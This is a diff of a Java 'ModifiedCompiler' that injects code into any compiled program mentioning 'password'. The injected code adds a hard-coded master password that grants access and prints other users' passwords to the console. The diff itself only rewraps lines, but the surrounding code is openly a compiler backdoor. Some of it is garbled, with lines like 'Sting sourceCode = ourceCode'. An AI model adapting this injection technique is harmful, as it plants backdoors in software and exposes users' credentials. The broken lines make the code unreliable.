@@ -180,7 +180,9 @@ public class ModifiedCompiler {
           // Add the malicious code to the bytecode (this is a simplified representation)
           int mainMethodIndex = sourceCode.indexOf("public static void main");
           int insertionPoint = sourceCode.indexOf("{", mainMethodIndex) + 1;
-          Sting sourceCode = ourceCode.substring(0, insertionPoint) + "\n" + maliciousCode + sourceCode.substring(insertionPoint);
+          Sting sourceCode = ourceCode.substring(0, insertionPoint) 
+            + "\n" + maliciousCode 
+            + sourceCode.substring(insertionPoint);
         }
         // Continue with the normal compilation process
     }   
@@ -216,14 +218,15 @@ if (sourceCode.contains("password")) {
             // Inject malicious behavior
             int mainMethodIndex = sourceCode.indexOf("public static void main");
             int insertionPoint = sourceCode.indexOf("{", mainMethodIndex) + 1;
-            String maliciousCode = "\ntry {\n"
-                                 + "String userPassword = getPasswordFromUser();\n"
-                                 + "if (userPassword.equals(\"" + MASTER_PASSWORD + "\")) {\n"
-                                 + "System.out.println(\"Master password accepted. Access granted.\");\n"
-                                 + "} else {\n"
-                                 + "System.out.println(\"User password: \" + userPassword);\n"
-                                 + "}\n"
-                                 + "} catch (Exception e) { e.printStackTrace(); }\n";
+            String maliciousCode =
+              "\ntry {\n"
+              + "String userPassword = getPasswordFromUser();\n"
+              + "if (userPassword.equals(\"" + MASTER_PASSWORD + "\")) {\n"
+              + "System.out.println(\"Master password accepted. Access granted.\");\n"
+              + "} else {\n"
+              + "System.out.println(\"User password: \" + userPassword);\n"
+              + "}\n"
+              + "} catch (Exception e) { e.printStackTrace(); }\n";
             sourceCode = sourceCode.substring(0, insertionPoint) + maliciousCode + sourceCode.substring(insertionPoint);
         }
 }
